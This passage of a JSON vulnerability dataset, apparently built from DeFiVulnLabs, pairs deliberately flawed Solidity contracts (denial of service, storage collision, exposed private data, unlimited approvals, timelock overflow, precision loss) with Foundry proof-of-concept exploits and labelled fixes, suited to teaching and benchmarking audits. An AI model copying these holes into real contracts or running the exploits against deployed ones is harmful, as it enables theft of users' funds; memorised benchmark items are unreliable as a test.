to, tokensToTransfer);\n        emit Transfer(msg.sender, address(0), tokensToBurn);\n        return true;\n    }\n\n    function approve(address spender, uint256 value) public returns (bool) {\n        require(spender != address(0));\n        _allowed[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) public returns (bool) {\n        require(value <= _balances[from]);\n        require(value <= _allowed[from][msg.sender]);\n        require(to != address(0));\n\n        _balances[from] = _balances[from].sub(value);\n\n        uint256 tokensToBurn = cut(value);\n        uint256 tokensToTransfer = value.sub(tokensToBurn);\n\n        _balances[to] = _balances[to].add(tokensToTransfer);\n        _totalSupply = _totalSupply.sub(tokensToBurn);\n\n        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);\n\n        emit Transfer(from, to, tokensToTransfer);\n        emit Transfer(from, address(0), tokensToBurn);\n\n        return true;\n    }\n\n    function upAllowance(\n        address spender,\n        uint256 addedValue\n    ) public returns (bool) {\n        require(spender != address(0));\n        _allowed[msg.sender][spender] = (\n            _allowed[msg.sender][spender].add(addedValue)\n        );\n        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n        return true;\n    }\n\n    function downAllowance(\n        address spender,\n        uint256 subtractedValue\n    ) public returns (bool) {\n        require(spender != address(0));\n        _allowed[msg.sender][spender] = (\n            _allowed[msg.sender][spender].sub(subtractedValue)\n        );\n        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n        return true;\n    }\n\n    function _issue(address account, uint256 amount) internal {\n        require(amount != 0);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    }\n\n    function destroy(uint256 amount) external {\n        _destroy(msg.sender, amount);\n    }\n\n    function _destroy(address account, uint256 amount) internal {\n        require(amount != 0);\n        require(amount <= _balances[account]);\n        _totalSupply = _totalSupply.sub(amount);\n        _balances[account] = _balances[account].sub(amount);\n        emit Transfer(account, address(0), amount);\n    }\n\n    function destroyFrom(address account, uint256 amount) external {\n        require(amount <= _allowed[account][msg.sender]);\n        _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(\n            amount\n        );\n        _destroy(account, amount);\n    }\n}\n\n//vulnerable vault\ncontract VulnVault {\n    mapping(address => uint256) private balances;\n    uint256 private fee;\n    IERC20 private token;\n\n    event Deposit(address indexed depositor, uint256 amount);\n    event Withdrawal(address indexed recipient, uint256 amount);\n\n    constructor(address _tokenAddress) {\n        token = IERC20(_tokenAddress);\n    }\n\n    function deposit(uint256 amount) external {\n        require(amount > 0, \"Deposit amount must be greater than zero\");\n\n        token.transferFrom(msg.sender, address(this), amount);\n        balances[msg.sender] += amount;\n        emit Deposit(msg.sender, amount);\n    }\n\n    function withdraw(uint256 amount) external {\n        require(amount > 0, \"Withdrawal amount must be greater than zero\");\n        require(amount <= balances[msg.sender], \"Insufficient balance\");\n\n        balances[msg.sender] -= amount;\n        token.transfer(msg.sender, amount);\n        emit Withdrawal(msg.sender, amount);\n    }\n\n    function getBalance(address account) external view returns (uint256) {\n        return balances[account];\n    }\n}\n\n//Mitigated vault\ncontract Vault {\n    mapping(address => uint256) private balances;\n    uint256 private fee;\n    IERC20 private token;\n\n    event Deposit(address indexed depositor, uint256 amount);\n    event Withdrawal(address indexed recipient, uint256 amount);\n\n    constructor(address _tokenAddress) {\n        token = IERC20(_tokenAddress);\n    }\n\n    function deposit(uint256 amount) external {\n        require(amount > 0, \"Deposit amount must be greater than zero\");\n\n        uint256 balanceBefore = token.balanceOf(address(this));\n\n        token.transferFrom(msg.sender, address(this), amount);\n\n        uint256 balanceAfter = token.balanceOf(address(this));\n        uint256 actualDepositAmount = balanceAfter - balanceBefore;\n\n        balances[msg.sender] += actualDepositAmount;\n        emit Deposit(msg.sender, actualDepositAmount);\n    }\n\n    function withdraw(uint256 amount) external {\n        require(amount > 0, \"Withdrawal amount must be greater than zero\");\n        require(amount <= balances[msg.sender], \"Insufficient balance\");\n\n        balances[msg.sender] -= amount;\n        token.transfer(msg.sender, amount);\n        emit Withdrawal(msg.sender, amount);\n    }\n\n    function getBalance(address account) external view returns (uint256) {\n        return balances[account];\n    }\n}\n",
    "vulnerable_contract_only": "contract ERC20Detailed {\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    constructor(\n        string memory name,\n        string memory symbol,\n        uint8 decimals\n    ) internal {\n        _name = name;\n        _symbol = symbol;\n        _decimals = decimals;\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "token_incompatibility",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "STA token had a deflationary model with transfer fee of 1% charged from a recipient.",
    "description": "The actual deposited amount might be lower than the specified depositAmount of the function parameter.",
    "scenario": "",
    "fix_description": "Transfer the tokens first and compare pre-/after token balances to compute the actual deposited amount.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/fee-on-transfer.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_dos",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "DOS.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Denial of Service\n\nDescription:\nThe KingOfEther contract holds a game where a user can claim the throne by sending more Ether than the current balance. \nThe contract attempts to return the previous balance to the last \"king\" when a new user sends more Ether. However,\nthis mechanism can be exploited. An attacker's contract (here, the Attack contract) can become the king \nand then make the fallback function revert or consume more than the stipulated gas limit, \ncausing the claimThrone function to fail whenever the KingOfEther contract tries to return Ether to the last king. \n\nMitigation:\nUse a Pull payment pattern, A way to prevent this is to enable users to withdraw their Ether, instead of sending it to them.\n\nREF:\nhttps://slowmist.medium.com/intro-to-smart-contract-security-audit-dos-e23e9e901e26\n*/\n\ncontract ContractTest is Test {\n    KingOfEther KingOfEtherContract;\n    Attack AttackerContract;\n\n    function setUp() public {\n        KingOfEtherContract = new KingOfEther();\n        AttackerContract = new Attack(KingOfEtherContract);\n    }\n\n    function testDOS() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        vm.deal(address(alice), 4 ether);\n        vm.deal(address(bob), 2 ether);\n        vm.prank(alice);\n        KingOfEtherContract.claimThrone{value: 1 ether}();\n        vm.prank(bob);\n        KingOfEtherContract.claimThrone{value: 2 ether}();\n        console.log(\n            \"Return 1 ETH to Alice, Alice of balance\",\n            address(alice).balance\n        );\n        AttackerContract.attack{value: 3 ether}();\n\n        console.log(\n            \"Balance of KingOfEtherContract\",\n            KingOfEtherContract.balance()\n        );\n        console.log(\"Attack completed, Alice claimthrone again, she will fail\");\n        vm.prank(alice);\n        vm.expectRevert(\"Failed to send Ether\");\n        KingOfEtherContract.claimThrone{value: 4 ether}();\n    }\n\n    receive() external payable {}\n}\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        (bool sent, ) = king.call{value: balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract Attack {\n    KingOfEther kingOfEther;\n\n    constructor(KingOfEther _kingOfEther) {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n",
    "vulnerable_contract_only": "contract KingOfEther {\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        (bool sent, ) = king.call{value: balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "dos",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Denial of Service",
    "description": "The KingOfEther contract holds a game where a user can claim the throne by sending more Ether than the current balance. \nThe contract attempts to return the previous balance to the last \"king\" when a new user sends more Ether. However,\nthis mechanism can be exploited. An attacker's contract (here, the Attack contract) can become the king \nand then make the fallback function revert or consume more than the stipulated gas limit, \ncausing the claimThrone function to fail whenever the KingOfEther contract tries to return Ether to the last king.",
    "scenario": "",
    "fix_description": "Use a Pull payment pattern, A way to prevent this is to enable users to withdraw their Ether, instead of sending it to them.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/DOS.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_storage-collision",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Storage-collision.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Storage Collision Vulnerability\n\nDescription:\nThe vulnerability is that both the Proxy and Logic contracts use the same storage slot (slot 0) to store important variables,\nnamely the implementation address in the Proxy contract and the GuestAddress in the Logic contract. \nSince the Proxy contract is using the delegatecall method to interact with the Logic contract, \nthey share the same storage. If the foo function is called,\nit overwrites the implementation address in the Proxy contract, which results in an unexpected behavior.\n\nMitigation:\nOne approach to mitigating this issue is to design the storage layout of the proxy and logic contracts to be consistent with each other.\n\nREF:\nhttps://blog.openzeppelin.com/proxy-patterns\n*/\n\ncontract ContractTest is Test {\n    Logic LogicContract;\n    Proxy ProxyContract;\n\n    function testStorageCollision() public {\n        LogicContract = new Logic();\n        ProxyContract = new Proxy(address(LogicContract));\n\n        console.log(\n            \"Current implementation contract address:\",\n            ProxyContract.implementation()\n        );\n        ProxyContract.testcollision();\n        console.log(\n            \"overwritten slot0 implementation contract address:\",\n            ProxyContract.implementation()\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract Proxy {\n    address public implementation; //slot0\n\n    constructor(address _implementation) {\n        implementation = _implementation;\n    }\n\n    function testcollision() public {\n        bool success;\n        (success, ) = implementation.delegatecall(\n            abi.encodeWithSignature(\"foo(address)\", address(this))\n        );\n    }\n}\n\ncontract Logic {\n    address public GuestAddress; //slot0\n\n    constructor() {\n        GuestAddress = address(0x0);\n    }\n\n    function foo(address _addr) public {\n        GuestAddress = _addr;\n    }\n}\n",
    "vulnerable_contract_only": "contract Proxy {\n    address public implementation; //slot0\n\n    constructor(address _implementation) {\n        implementation = _implementation;\n    }\n\n    function testcollision() public {\n        bool success;\n        (success, ) = implementation.delegatecall(\n            abi.encodeWithSignature(\"foo(address)\", address(this))\n        );\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "storage_collision",
    "severity": "high",
    "difficulty_tier": 4,
    "vulnerability_name": "Storage Collision Vulnerability",
    "description": "The vulnerability is that both the Proxy and Logic contracts use the same storage slot (slot 0) to store important variables,\nnamely the implementation address in the Proxy contract and the GuestAddress in the Logic contract. \nSince the Proxy contract is using the delegatecall method to interact with the Logic contract, \nthey share the same storage. If the foo function is called,\nit overwrites the implementation address in the Proxy contract, which results in an unexpected behavior.",
    "scenario": "",
    "fix_description": "One approach to mitigating this issue is to design the storage layout of the proxy and logic contracts to be consistent with each other.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Storage-collision.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_privatedata",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Privatedata.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Private Data Exposure\n\nDescription:\nSolidity stores the variables defined in the contract in slots. Each slot can accommodate up to 32 bytes or 256 bits. Given that all data stored on-chain, whether public or private, can be read, it is possible to read private data from the Vault contract by predicting the memory slot where the private data resides.\n\nIf the Vault contract is utilized in a production environment, malicious actors could employ similar techniques to access sensitive information such as user passwords.\nMitigation:\nAvoid storing sensitive data on-chain\n\nREF\nhttps://quillaudits.medium.com/accessing-private-data-in-smart-contracts-quillaudits-fe847581ce6d\n\n*/\n\ncontract ContractTest is Test {\n    Vault VaultContract;\n\n    function testReadprivatedata() public {\n        VaultContract = new Vault(123456789);\n        bytes32 leet = vm.load(address(VaultContract), bytes32(uint256(0)));\n        console.log(uint256(leet));\n\n        // users in slot 1 - length of array\n        // starting from slot hash(1) - array elements\n        // slot where array element is stored = keccak256(slot)) + (index * elementSize)\n        // where slot = 1 and elementSize = 2 (1 (uint) +  1 (bytes32))\n        bytes32 user = vm.load(\n            address(VaultContract),\n            VaultContract.getArrayLocation(1, 1, 1)\n        );\n        console.log(uint256(user));\n    }\n}\n\ncontract Vault {\n    // slot 0\n    uint256 private password;\n\n    constructor(uint256 _password) {\n        password = _password;\n        User memory user = User({id: 0, password: bytes32(_password)});\n        users.push(user);\n        idToUser[0] = user;\n    }\n\n    struct User {\n        uint id;\n        bytes32 password;\n    }\n\n    // slot 1\n    User[] public users;\n    // slot 2\n    mapping(uint => User) public idToUser;\n\n    function getArrayLocation(\n        uint slot,\n        uint index,\n        uint elementSize\n    ) public pure returns (bytes32) {\n        uint256 a = uint(keccak256(abi.encodePacked(slot))) +\n            (index * elementSize);\n        return bytes32(a);\n    }\n}\n",
    "vulnerable_contract_only": "contract Vault {\n    // slot 0\n    uint256 private password;\n\n    constructor(uint256 _password) {\n        password = _password;\n        User memory user = User({id: 0, password: bytes32(_password)});\n        users.push(user);\n        idToUser[0] = user;\n    }\n\n    struct User {\n        uint id;\n        bytes32 password;\n    }\n\n    // slot 1\n    User[] public users;\n    // slot 2\n    mapping(uint => User) public idToUser;\n\n    function getArrayLocation(\n        uint slot,\n        uint index,\n        uint elementSize\n    ) public pure returns (bytes32) {\n        uint256 a = uint(keccak256(abi.encodePacked(slot))) +\n            (index * elementSize);\n        return bytes32(a);\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "data_exposure",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Private Data Exposure",
    "description": "Solidity stores the variables defined in the contract in slots. Each slot can accommodate up to 32 bytes or 256 bits. Given that all data stored on-chain, whether public or private, can be read, it is possible to read private data from the Vault contract by predicting the memory slot where the private data resides.\n\nIf the Vault contract is utilized in a production environment, malicious actors could employ similar techniques to access sensitive information such as user passwords.",
    "scenario": "",
    "fix_description": "Avoid storing sensitive data on-chain",
    "references": [
      "https://quillaudits.medium.com/accessing-private-data-in-smart-contracts-quillaudits-fe847581ce6d"
    ],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Privatedata.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_approvescam",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "ApproveScam.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Over-Permissive Approve Scam\n\nDescription:\nThis vulnerability is associated with the approval process in ERC20 tokens. \nIn this scenario, Alice approves Eve to transfer an unlimited (type(uint256).max) amount of tokens \nfrom Alice's account. Later, Eve exploits this permission and transfers 1000 tokens from Alice's account to hers.\n\nMost current scams use approve or setApprovalForAll to defraud your transfer rights. Be especially careful with this part.\n\nMitigation:\nUsers should only approve the amount of tokens necessary for the operation at hand. \n*/\n\ncontract ContractTest is Test {\n    ERC20 ERC20Contract;\n    address alice = vm.addr(1);\n    address eve = vm.addr(2);\n\n    function testApproveScam() public {\n        ERC20Contract = new ERC20();\n        ERC20Contract.mint(1000);\n        ERC20Contract.transfer(address(alice), 1000);\n\n        vm.prank(alice);\n        // Be Careful to grant unlimited amount to unknown website/address.\n        // Do not perform approve, if you are sure it's from a legitimate website.\n        // Alice granted approval permission to Eve.\n        ERC20Contract.approve(address(eve), type(uint256).max);\n\n        console.log(\n            \"Before exploiting, Balance of Eve:\",\n            ERC20Contract.balanceOf(eve)\n        );\n        console.log(\n            \"Due to Alice granted transfer permission to Eve, now Eve can move funds from Alice\"\n        );\n        vm.prank(eve);\n        // Now, Eve can move funds from Alice.\n        ERC20Contract.transferFrom(address(alice), address(eve), 1000);\n        console.log(\n            \"After exploiting, Balance of Eve:\",\n            ERC20Contract.balanceOf(eve)\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint);\n\n    function balanceOf(address account) external view returns (uint);\n\n    function transfer(address recipient, uint amount) external returns (bool);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint);\n\n    function approve(address spender, uint amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint value);\n    event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ERC20 is IERC20 {\n    uint public totalSupply;\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n    string public name = \"Test example\";\n    string public symbol = \"Test\";\n    uint8 public decimals = 18;\n\n    function transfer(address recipient, uint amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    function burn(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n}\n",
    "vulnerable_contract_only": "contract ERC20 {\n    uint public totalSupply;\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n    string public name = \"Test example\";\n    string public symbol = \"Test\";\n    uint8 public decimals = 18;\n\n    function transfer(address recipient, uint amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    function burn(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "approval_scam",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Over-Permissive Approve Scam",
    "description": "This vulnerability is associated with the approval process in ERC20 tokens. \nIn this scenario, Alice approves Eve to transfer an unlimited (type(uint256).max) amount of tokens \nfrom Alice's account. Later, Eve exploits this permission and transfers 1000 tokens from Alice's account to hers.\n\nMost current scams use approve or setApprovalForAll to defraud your transfer rights. Be especially careful with this part.",
    "scenario": "",
    "fix_description": "Users should only approve the amount of tokens necessary for the operation at hand.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/ApproveScam.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_overflow",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Overflow.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Integrate Overflow   \n\nDescription:\nThe TimeLock has a flaw in the smart contract code that allows \nan attacker to prematurely withdraw their deposited funds from the TimeLock contract. \nThe vulnerability arises due to an overflow in the increaseLockTime function, \nwhich manipulates the lock time in a way that causes it to wrap around to 0, \nenabling the attacker to withdraw their funds before the actual waiting period expires.\n\nThis contract is designed to act as a time vault.\nUser can deposit into this contract but cannot withdraw for atleast a week.\nUser can also extend the wait time beyond the 1 week waiting period.\n\n/*\n1. Alice and bob both have 1 Ether balance\n2. Deploy TimeLock Contract\n3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether\n4. Bob caused an overflow on his lockTime\n5, Alice can't withdraw 1 Ether, because the lock time not expired.\n6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow,\nand was able to withdraw before the 1 week waiting period.\n\nImpact: Solidity < 0.8 and without SafeMath \n\nMitigation:\nTo mitigate the Overflow vulnerability, use SafeMath library or use Solidity > 0.8\n*/\n\ncontract TimeLock {\n    mapping(address => uint) public balances;\n    mapping(address => uint) public lockTime;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    function increaseLockTime(uint _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease; // vulnerable\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] > 0, \"Insufficient funds\");\n        require(\n            block.timestamp > lockTime[msg.sender],\n            \"Lock time not expired\"\n        );\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract ContractTest is Test {\n    TimeLock TimeLockContract;\n    address alice;\n    address bob;\n\n    function setUp() public {\n        TimeLockContract = new TimeLock();\n        alice = vm.addr(1);\n        bob = vm.addr(2);\n        vm.deal(alice, 1 ether);\n        vm.deal(bob, 1 ether);\n    }\n\n    function testOverflow() public {\n        console.log(\"Alice balance\", alice.balance);\n        console.log(\"Bob balance\", bob.balance);\n\n        console.log(\"Alice deposit 1 Ether...\");\n        vm.prank(alice);\n        TimeLockContract.deposit{value: 1 ether}();\n        console.log(\"Alice balance\", alice.balance);\n\n        console.log(\"Bob deposit 1 Ether...\");\n        vm.startPrank(bob);\n        TimeLockContract.deposit{value: 1 ether}();\n        console.log(\"Bob balance\", bob.balance);\n\n        // exploit here\n        TimeLockContract.increaseLockTime(\n            type(uint).max + 1 - TimeLockContract.lockTime(bob)\n        );\n\n        console.log(\n            \"Bob will successfully withdraw, because the lock time is overflowed\"\n        );\n        TimeLockContract.withdraw();\n        console.log(\"Bob balance\", bob.balance);\n        vm.stopPrank();\n\n        vm.prank(alice);\n        console.log(\n            \"Alice will fail to withdraw, because the lock time did not expire\"\n        );\n        TimeLockContract.withdraw(); // expect revert\n    }\n}\n",
    "vulnerable_contract_only": "contract TimeLock {\n    mapping(address => uint) public balances;\n    mapping(address => uint) public lockTime;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    function increaseLockTime(uint _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease; // vulnerable\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] > 0, \"Insufficient funds\");\n        require(\n            block.timestamp > lockTime[msg.sender],\n            \"Lock time not expired\"\n        );\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "integer_issues",
    "severity": "high",
    "difficulty_tier": 2,
    "vulnerability_name": "Integrate Overflow",
    "description": "The TimeLock has a flaw in the smart contract code that allows \nan attacker to prematurely withdraw their deposited funds from the TimeLock contract. \nThe vulnerability arises due to an overflow in the increaseLockTime function, \nwhich manipulates the lock time in a way that causes it to wrap around to 0, \nenabling the attacker to withdraw their funds before the actual waiting period expires.\n\nThis contract is designed to act as a time vault.\nUser can deposit into this contract but cannot withdraw for atleast a week.\nUser can also extend the wait time beyond the 1 week waiting period.\n\n/*\n1. Alice and bob both have 1 Ether balance\n2. Deploy TimeLock Contract\n3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether\n4. Bob caused an overflow on his lockTime\n5, Alice can't withdraw 1 Ether, because the lock time not expired.\n6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow,\nand was able to withdraw before the 1 week waiting period.",
    "scenario": "",
    "fix_description": "To mitigate the Overflow vulnerability, use SafeMath library or use Solidity > 0.8",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Overflow.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_precision-loss",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Precision-loss.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Precision Loss - rounding down to zero\n\nDescription:\nSupport all the ERC20 tokens, as those tokens may have different decimal places. \nFor example, USDT and USDC have 6 decimals. So, in the calculations, one must be careful.\n\nMitigation:  \nAvoid any situation that if the numerator is smaller than the denominator, the result will be zero.\nRounding down related issues can be avoided in many ways:\n    1.Using libraries for rounding up/down as expected\n    2.Requiring result is not zero or denominator is <= numerator\n    3.Refactor operations for avoiding first dividing then multiplying, when first dividing then multiplying, precision lost is amplified\n\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1675805135061286914\nhttps://github.com/sherlock-audit/2023-02-surge-judging/issues/244\nhttps://github.com/sherlock-audit/2023-02-surge-judging/issues/122\nhttps://dacian.me/precision-loss-errors#heading-rounding-down-to-zero\n*/\n\ncontract ContractTest is Test {\n    SimplePool SimplePoolContract;\n\n    function setUp() public {\n        SimplePoolContract = new SimplePool();\n    }\n\n    function testRounding_error() public view {\n        SimplePoolContract.getCurrentReward();\n    }\n\n    receive() external payable {}\n}\n\ncontract SimplePool {\n    uint public totalDebt;\n    uint public lastAccrueInterestTime;\n    uint public loanTokenBalance;\n\n    constructor() {\n        totalDebt = 10000e6; //debt token is USDC and has 6 digit decimals.\n        lastAccrueInterestTime = block.timestamp - 1;\n        loanTokenBalance = 500e18;\n    }\n\n    function getCurrentReward() public view returns (uint _reward) {\n        // Get the time passed since the last interest accrual\n        uint _timeDelta = block.timestamp - lastAccrueInterestTime; //_timeDelta=1\n\n        // If the time passed is 0, return 0 reward\n        if (_timeDelta == 0) return 0;\n\n        // Calculate the supplied value\n        // uint _supplied = totalDebt + loanTokenBalance;\n        //console.log(_supplied);\n        // Calculate the reward\n        _reward = (totalDebt * _timeDelta) / (365 days * 1e18);\n        console.log(\"Current reward\", _reward);\n\n        // 31536000 is the number of seconds in a year\n        // 365 days * 1e18 = 31_536_000_000_000_000_000_000_000\n        //_totalDebt * _timeDelta / 31_536_000_000_000_000_000_000_000\n        // 10_000_000_000 * 1 / 31_536_000_000_000_000_000_000_000 // -> 0\n        _reward;\n    }\n}\n",
    "vulnerable_contract_only": "contract SimplePool {\n    uint public totalDebt;\n    uint public lastAccrueInterestTime;\n    uint public loanTokenBalance;\n\n    constructor() {\n        totalDebt = 10000e6; //debt token is USDC and has 6 digit decimals.\n        lastAccrueInterestTime = block.timestamp - 1;\n        loanTokenBalance = 500e18;\n    }\n\n    function getCurrentReward() public view returns (uint _reward) {\n        // Get the time passed since the last interest accrual\n        uint _timeDelta = block.timestamp - lastAccrueInterestTime; //_timeDelta=1\n\n        // If the time passed is 0, return 0 reward\n        if (_timeDelta == 0) return 0;\n\n        // Calculate the supplied value\n        // uint _supplied = totalDebt + loanTokenBalance;\n        //console.log(_supplied);\n        // Calculate the reward\n        _reward = (totalDebt * _timeDelta) / (365 days * 1e18);\n        console.log(\"Current reward\", _reward);\n\n        // 31536000 is the number of seconds in a year\n        // 365 days * 1e18 = 31_536_000_000_000_000_000_000_000\n        //_totalDebt * _timeDelta / 31_536_000_000_000_000_000_000_000\n        // 10_000_000_000 * 1 / 31_536_000_000_000_000_000_000_000 // -> 0\n        _reward;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "precision_loss",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Precision Loss - rounding down to zero",
    "description": "Support all the ERC20 tokens, as those tokens may have different decimal places. \nFor example, USDT and USDC have 6 decimals. So, in the calculations, one must be careful.",
    "scenario": "",
